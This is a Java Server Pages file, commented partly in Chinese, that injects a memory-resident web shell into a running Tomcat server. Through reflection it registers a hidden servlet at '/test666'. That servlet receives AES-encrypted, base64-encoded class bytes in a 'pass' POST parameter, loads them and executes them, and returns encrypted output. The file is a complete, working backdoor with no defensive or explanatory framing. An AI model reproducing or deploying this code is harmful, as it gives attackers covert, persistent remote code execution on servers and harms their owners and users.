<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="javax.management.MBeanServer" %>
<%@ page import="org.apache.tomcat.util.modeler.Registry" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="com.sun.jmx.mbeanserver.NamedObject" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.IOException" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="org.apache.catalina.core.StandardService" %>
<%@ page import="org.apache.catalina.mapper.Mapper" %>
<%@ page import="java.util.concurrent.ConcurrentHashMap" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%@ page import="org.apache.catalina.core.StandardWrapper" %>
<%@ page import="org.apache.catalina.core.ContainerBase" %>
<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%>
<%@page import="java.security.GeneralSecurityException"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@page import="javax.crypto.Cipher"%>


<%@page import="java.security.InvalidKeyException"%>
<%@page import="java.security.NoSuchAlgorithmException"%>
<%@ page import="java.net.URLClassLoader" %>
<%@ page import="java.net.URL" %>

<%
    class TomcatServlet extends HttpServlet {
        String xc = "j";
        String pass = "pass";
        String md5 = md5(pass + xc);
        Class payload;

        public  String md5(String s) {
            String ret = null;
            try {
                java.security.MessageDigest m;
                m = java.security.MessageDigest.getInstance("MD5");
                m.update(s.getBytes(), 0, s.length());
                ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
            } catch (Exception e) {
            }
            return ret;
        }

        public  String base64Encode(byte[] bs) throws Exception {
            Class base64;
            String value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
                value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        public  byte[] base64Decode(String bs) throws Exception {
            Class base64;
            byte[] value = null;
            try {
                base64 = Class.forName("java.util.Base64");
                Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e) {
                try {
                    base64 = Class.forName("sun.misc.BASE64Decoder");
                    Object decoder = base64.newInstance();
                    value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
                } catch (Exception e2) {
                }
            }
            return value;
        }

        public byte[] x(byte[] s, boolean m) {
            try {
                javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
                c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
                return c.doFinal(s);
            } catch (Exception e) {
                return null;
            }
        }

        public Class defClass(byte[] classBytes) throws Throwable {
            URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
            Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defMethod.setAccessible(true);
            return (Class) defMethod.invoke(urlClassLoader, classBytes, 0, classBytes.length);
        }

        @Override
        protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            try {
                byte[] data = base64Decode(req.getParameter(pass));
                data = x(data, false);
                if (payload == null) {
                    payload = defClass(data);
                } else {
                    java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                    Object f = payload.newInstance();
                    f.equals(arrOut);
                    f.equals(data);
                    f.equals(req);
                    resp.getWriter().write(md5.substring(0, 16));
                    f.toString();
                    resp.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                    resp.getWriter().write(md5.substring(16));
                }
            } catch (Throwable e) {
            }
        }
    }
%>

<%
try {
    //获取servletContext
    javax.servlet.ServletContext servletContext=request.getServletContext();

    //获取applicationContext
    java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField("context");
    contextField.setAccessible(true);
    org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);
    //获取standardContext
    contextField=applicationContext.getClass().getDeclaredField("context");
    contextField.setAccessible(true);
    org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

    Field serviceF = applicationContext.getClass().getDeclaredField("service");
    serviceF.setAccessible(true);
    StandardService service = (StandardService) serviceF.get(applicationContext);
    Mapper mapper = service.getMapper();
    Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField("contextObjectToContextVersionMap");
    contextObjectToContextVersionMapF.setAccessible(true);
    ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper);
    Object contextVersion = contextObjectToContextVersionMap.get(standardContext);
    java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
    stateField.setAccessible(true);
    Wrapper wrapper = (Wrapper) standardContext.findChild("test");
    if(wrapper ==null) {
        TomcatServlet tomcatServlet=new TomcatServlet();
        StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper();
        Field instanceF = wrappershell.getClass().getDeclaredField("instance");
        instanceF.setAccessible(true);
        instanceF.set(wrappershell,tomcatServlet);
        wrappershell.setServletClass("TomcatServlet");
        Field parent = ContainerBase.class.getDeclaredField("parent");
        parent.setAccessible(true);
        parent.set(wrappershell, standardContext);
        wrappershell.addMapping("/test666");
        Class[] classes = mapper.getClass().getDeclaredClasses();
        Class contextversionClass = classes[1];
        Method addWrapper = mapper.getClass().getDeclaredMethod("addWrapper", contextversionClass, String.class, Wrapper.class, boolean.class, boolean.class);
        addWrapper.setAccessible(true);
        addWrapper.invoke(mapper, contextVersion, "/test666", wrappershell, false, false);
        out.println("Servlet has been Inject,please visit /test666 to access shell and visit /test666?sectest666=unload to unload shell!!!");
    }
}catch (Exception e){
    e.printStackTrace();
}
%>